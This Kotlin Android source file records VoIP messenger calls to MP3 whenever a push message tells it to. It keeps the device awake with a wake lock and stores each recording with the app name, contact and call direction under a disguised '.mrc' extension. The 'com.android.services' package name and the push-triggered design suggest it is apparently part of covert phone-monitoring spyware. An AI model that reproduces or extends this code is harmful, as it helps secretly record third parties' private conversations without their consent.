package com.android.services.workers.voip

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import android.util.Log
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import androidx.work.Data
import androidx.work.WorkManager
import com.android.services.db.entities.VoipCall
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.VoipCallRecord
import com.android.services.receiver.AudioFileCompressorReceiver
import com.android.services.services.callRecord.CallRecorderService
import com.android.services.services.voip.VoipCallCommandProcessingBaseI
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.Mp3LameRecorder
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.android.services.util.sizeInKb
import com.android.services.workers.callRecord.CallRecordWorkerService
import com.arthenica.mobileffmpeg.Config
import com.arthenica.mobileffmpeg.FFmpeg
import com.google.gson.Gson
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.core.Observable
import io.reactivex.rxjava3.schedulers.Schedulers
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.greenrobot.eventbus.EventBus
import java.io.File
import java.util.concurrent.TimeUnit

class VoipCallRecordProcessingBaseImpll(
    val context: Context,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : VoipCallRecordProcessingBase(context) {
    override fun initialize() {
        logVerbose("In OnCreate", AppConstants.VOIP_CALL_TYPE)
        logVerbose("In OnCreate voip call recording", "VoipCallRecordingInfo")
        AppUtils.appendLog(
            context.applicationContext,
            "${AppConstants.VOIP_CALL_TYPE} In OnCreate"
        )
        voipCallStatus = FcmPushStatus.INITIALIZED.getStatus()
    }

    override fun parseIntent(data: Data?) {
        data?.let {
            acquireWakeLock()
            logVerbose(
                "${AppConstants.VOIP_CALL_TYPE} In OnStartCommand -> Ready to start VoipCall Recording"
            )
            AppUtils.appendLog(
                context.applicationContext,
                "${AppConstants.VOIP_CALL_TYPE} In OnStartCommand -> Ready to start VoipCall Recording"
            )
            val voipCallRecordJsonString = it.getString(VOIP_CALL_RECORD)
            voipCallRecordJsonString?.let {
                voipCallRecord =
                    Gson().fromJson(voipCallRecordJsonString, VoipCallRecord::class.java)
                logVerbose("VoipCall Push = $voipCallRecord", "VoipCallRecordingInfo")
                logVerbose("VoipCall Push = $voipCallRecord", AppConstants.VOIP_CALL_TYPE)
                AppUtils.appendLog(
                    context.applicationContext,
                    "VoipCall Push = $voipCallRecord"
                )
                voipCallRecord?.let { _ ->
                    intervalConsumed = 0
                    executorService.execute {
                        startTimerObserver()
                        startRecording()
                    }
                } ?: kotlin.run {
                    AppUtils.appendLog(
                        context.applicationContext,
                        "VoipCall Push is Null -> Stopping Service"
                    )
                    logVerbose("${AppConstants.VOIP_CALL_TYPE} VoipCall Push is Null -> Stopping Service")
                    stopThisWorkerService()
                }
            }
        } ?: kotlin.run {
            logVerbose("${AppConstants.VOIP_CALL_TYPE} Voip Call Intent is Null, Stopping Service")
            AppUtils.appendLog(
                applicationContext,
                "${AppConstants.VOIP_CALL_TYPE} Voip Call Intent is Null, Stopping Service"
            )
            stopThisWorkerService()
        }
    }

    private fun stopThisWorkerService() {
        WorkManager.getInstance(context)
            .cancelUniqueWork(VoipCallRecordProcessingBase.TAG_VOIP_CALL_RECORDING_WORKER)
    }

    private fun startTimerObserver() {
        disposable =
            Observable.interval(
                INITIAL_DELAY,
                PERIODIC_INTERVAL, TimeUnit.MILLISECONDS
            )
                .subscribeOn(Schedulers.single())
                .observeOn(AndroidSchedulers.mainThread())
                .doOnSubscribe { }
                .subscribe {
                    if (!AppUtils.isVOIPModeActive(context)) {
                        logVerbose("VoipCall ends", "VoipCallRecordingInfo")
                        logVerbose("${AppConstants.VOIP_CALL_TYPE} VoipMode In-active -> Stopping Service")
                        stopThisWorkerService()
                    } else {
                        logVerbose("${AppConstants.VOIP_CALL_TYPE} VoipMode -> Active")
                        logVerbose("VoipCall still active", "VoipCallRecordingInfo")
                        AppUtils.appendLog(
                            context.applicationContext,
                            "${AppConstants.VOIP_CALL_TYPE} VoipMode -> Active"
                        )
                    }
                }
    }

    override fun createOutputFilePath() {
        randomUniqueId = AppUtils.randomUniqueId
        mFilePath = AppUtils.retrieveFilePath(
            applicationContext,
            AppConstants.DIR_VOIP_CALL_RECORD,
            System.currentTimeMillis().toString() + "_" + randomUniqueId + ".mp3"
        )
    }

    override fun startRecording() {
        mRecordingStartTime = System.currentTimeMillis()
        val isCallRecording =
            AppUtils.isServiceRunning(applicationContext, CallRecordWorkerService::class.java.name);
        if (isCallRecording) {
            logVerbose(
                "Call Recording already runnging",
                "CallRecordingInfo"
            )
            EventBus.getDefault().post("stopCallRecording")
        }
        logVerbose("Call recording started in VoipCallRecordService", "CallRecordingInfo")
        try {
            logVerbose("${AppConstants.VOIP_CALL_TYPE} Preparing to Start Recording")
            logVerbose("VoipCall recording going to start", "VoipCallRecordingInfo")
            recorder = Mp3LameRecorder(mFilePath, 44100)
            recorder!!.startRecording(Mp3LameRecorder.TYPE_CALL_RECORD)
        } catch (exp: Exception) {
            logException(
                "${AppConstants.VOIP_CALL_TYPE} Start Recording Exception = ${exp.message}",
                throwable = exp
            )
            AppUtils.appendLog(
                context.applicationContext,
                "Start Recording Exception = ${exp.message}"
            )
            updateVoipCallPushAsCorrupted()
        }
    }

    override fun startCommand() {
    }

    override suspend fun stopRecording() {
        withContext(Dispatchers.IO) {
            logVerbose("VoipCall Preparing to Stop Recording", "VoipCallRecordingInfo")
            logVerbose("${AppConstants.VOIP_CALL_TYPE} Preparing to Stop Recording")
            AppUtils.appendLog(
                context.applicationContext,
                "${AppConstants.VOIP_CALL_TYPE} Preparing to Stop Recording"
            )
            try {
                if (recorder != null) {
                    recorder!!.stopRecording()
                    recorder = null
                    logVerbose("${AppConstants.VOIP_CALL_TYPE} Recording Stopped")
                    AppUtils.appendLog(
                        context.applicationContext,
                        "${AppConstants.VOIP_CALL_TYPE} Recording Stopped"
                    )
                    logVerbose("VoipCall Recording Stopped", "VoipCallRecordingInfo")

                }
            } catch (e: Exception) {
                logException(
                    "${AppConstants.VOIP_CALL_TYPE} Stop Recording Exception = ${e.message}",
                    throwable = e
                )
                AppUtils.appendLog(
                    context.applicationContext,
                    "Stop Recording Exception = ${e.message}"
                )
                updateVoipCallPushAsCorrupted()
            }
        }
    }

    override fun onServiceDestroy() {
        logVerbose("${AppConstants.VOIP_CALL_TYPE} In OnDestroy -> Releasing Resources")
        AppUtils.appendLog(
            context.applicationContext,
            "${AppConstants.VOIP_CALL_TYPE} In OnDestroy -> Releasing Resources"
        )
        if (voipCallStatus == FcmPushStatus.INITIALIZED.getStatus()) {
            voipCallStatus = FcmPushStatus.SUCCESS.getStatus()
        }
        coroutineScope.launch {
            try {
                stopRecording()
                reNameFile(applicationContext, mFilePath, null)
                insertVoipCall()
                if (disposable != null && !disposable!!.isDisposed)
                    disposable!!.dispose()
                shutDownExecutorService()
                releaseWakeLock()
                logVerbose(
                    "stopping voip recording service",
                    "VoipCallRecordingInfo"
                )
                LocalBroadcastManager.getInstance(applicationContext)
                    .sendBroadcast(Intent(AudioFileCompressorReceiver.ACTION_COMPRESS_AUDIO))
            } catch (exp: Exception) {
                logException("${AppConstants.VOIP_CALL_TYPE} onDestroy Exception = ${exp.message}")
                AppUtils.appendLog(
                    context.applicationContext,
                    "${AppConstants.VOIP_CALL_TYPE} onDestroy Exception = ${exp.message}"
                )
                updateVoipCallPushAsCorrupted(isOnDestroy = true)
            }
        }
    }

    private suspend fun reNameFile(context: Context, sourceFile: String, destFile: String?) {
        withContext(Dispatchers.IO) {
            if (destFile != null) {
                AppUtils.reNameSourceFileWithDestFile(
                    context,
                    sourceFile,
                    destFile,
                    AppConstants.VOIP_CALL_TYPE
                )
            } else {
                AppUtils.reNameFile(sourceFile, AppConstants.VIDEO_BUG_TYPE)
                AppUtils.appendLog(
                    context.applicationContext,
                    "${AppConstants.VOIP_CALL_TYPE} Compression destFile Path is Null"
                )
                logVerbose("${AppConstants.VOIP_CALL_TYPE} Compression destFile Path is Null")
            }
//            localDatabaseSource.updateVoipCallCompressionStatus(mFilePath.replace(".mp3", ".mrc"), 1)
        }
    }

    /** This compresses the Output VoipCall File **/
    private suspend fun compressOutputFile(): String? {
        return try {
            if (AppConstants.osGreaterThanEqualToNougat) {
                withContext(Dispatchers.IO) {
                    val destFile = "compress_${mFilePath.substringAfterLast("/")}"
                    val destFilePath =
                        mFilePath.replace(mFilePath.substringAfterLast("/"), destFile)
//            val rc = FFmpeg.execute("-i $mFilePath -c:v mpeg4 $destFilePath")
                    when (val rc =
                        FFmpeg.execute("-y -i $mFilePath -ar 44100 -ac 2 -ab 20k -c:v mpeg4 $$destFilePath")) {
                        Config.RETURN_CODE_SUCCESS -> {
                            AppUtils.appendLog(
                                context.applicationContext,
                                "${AppConstants.VOIP_CALL_TYPE} Command execution completed successfully."
                            )
                            logVerbose(
                                "Command execution completed successfully.",
                                AppConstants.VOIP_CALL_TYPE
                            )
                            destFilePath
                        }

                        Config.RETURN_CODE_CANCEL -> {
                            AppUtils.appendLog(
                                context.applicationContext,
                                "${AppConstants.VOIP_CALL_TYPE} Command execution cancelled by user."
                            )
                            logVerbose("${AppConstants.VOIP_CALL_TYPE} Command execution cancelled by user.")
                            AppUtils.deleteFile(applicationContext, destFilePath)
                            null
                        }

                        else -> {
                            AppUtils.appendLog(
                                context.applicationContext,
                                String.format(
                                    "Command execution failed with rc=%d and the output below.",
                                    rc
                                )
                            )
                            logVerbose(
                                String.format(
                                    "${AppConstants.VOIP_CALL_TYPE} Command execution failed with rc=%d and the output below.",
                                    rc
                                )
                            )
                            AppUtils.deleteFile(applicationContext, destFilePath)
                            Config.printLastCommandOutput(Log.INFO)
                            null
                        }
                    }
                }
            } else null
        } catch (e: Exception) {
            null
        }
    }

    private suspend fun insertVoipCall() {
        withContext(Dispatchers.IO) {
            mFilePath = mFilePath.replace(".mp3", ".mrc")
            val currentTimeInMilliSeconds = System.currentTimeMillis()
            val elapsedTime = (currentTimeInMilliSeconds - mRecordingStartTime).toInt() / 1000
            AppUtils.appendLog(
                context.applicationContext,
                "VoipCall file duration = ($mRecordingStartTime, $elapsedTime)"
            )
            logVerbose(
                "${AppConstants.VOIP_CALL_TYPE} VoipCall file duration = ($mRecordingStartTime, $elapsedTime)"
            )
            if (voipCallStatus == FcmPushStatus.SUCCESS.getStatus() || voipCallStatus == FcmPushStatus.INTERRUPTED.getStatus()) {
                if (AppUtils.validFileSize(File(mFilePath)) && elapsedTime > 2) {
                    var voipCallName = voipCallRecord!!.voipName
                    val checkThisVoipCallCountInDB =
                        localDatabaseSource.checkIfVoipCallAlreadyProceeded(voipCallRecord!!.voipDateTime)
                    voipCallName = "$voipCallName($checkThisVoipCallCountInDB)"
                    val voipCall = VoipCall()
                    voipCall.apply {
                        this.uniqueId = randomUniqueId
                        this.file = mFilePath
                        this.appName = voipCallRecord!!.voipMessenger
                        this.name = voipCallRecord!!.voipName
                        this.callNumber = voipCallName
                        this.callDirection = voipCallRecord!!.voipDirection
                        this.callType = voipCallRecord!!.voipType
                        this.callDuration = elapsedTime.toString()
                        this.callDateTime = voipCallRecord!!.voipDateTime
                        this.date = AppUtils.getDate(currentTimeInMilliSeconds)
                        this.isCompressed = 0
                        this.status = 0
                    }
                    localDatabaseSource.insertVoipCall(voipCall)
                    logVerbose("VoipCall inserted", "VoipCallRecordingInfo")
                } else {
                    AppUtils.appendLog(
                        context.applicationContext,
                        "${AppConstants.VOIP_CALL_TYPE} VoipCall  ${voipCallStatus} failed with duration = $elapsedTime and Size = ${
                            File(
                                mFilePath
                            ).sizeInKb
                        }"
                    )
                    logVerbose(
                        "${AppConstants.VOIP_CALL_TYPE} VoipCall  ${voipCallStatus} failed with duration = $elapsedTime and Size = ${
                            File(
                                mFilePath
                            ).sizeInKb
                        }"
                    )
                    logVerbose("VoipCall not inserted", "VoipCallRecordingInfo")
                }
            } else {
                AppUtils.appendLog(
                    context.applicationContext,
                    "VoipCall failed with status ${voipCallStatus}"
                )
                logVerbose(
                    "${AppConstants.VOIP_CALL_TYPE} VoipCall failed with status ${voipCallStatus}"
                )
                logVerbose(
                    "VoipCall not inserted because of failed status",
                    "VoipCallRecordingInfo"
                )
                return@withContext
            }
        }
    }

    private fun updateVoipCallPushAsCorrupted(isOnDestroy: Boolean = false) {
        logVerbose("${AppConstants.VOIP_CALL_TYPE} voip call failed, deleting file $mFilePath")
        AppUtils.appendLog(
            context.applicationContext,
            "${AppConstants.VOIP_CALL_TYPE} voip call failed, deleting file $mFilePath"
        )
        voipCallStatus = FcmPushStatus.FILE_CORRUPTED.getStatus()
        coroutineScope.launch {
            withContext(Dispatchers.IO) {
                AppUtils.deleteFile(applicationContext, mFilePath)
            }
        }
        if (!isOnDestroy)
            stopThisWorkerService()
    }

    private fun acquireWakeLock() {
        val pm =
            context.applicationContext.getSystemService(Service.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            TOS_VOIP_CALL_WORK
        )
        wakeLock!!.acquire(10 * 60 * 1000L /*10 minutes*/)
    }

    private fun releaseWakeLock() {
        if (wakeLock != null && wakeLock!!.isHeld) wakeLock!!.release()
    }

    private fun shutDownExecutorService() {
        if (!executorService.isShutdown) {
            executorService.shutdown()
        }
    }
}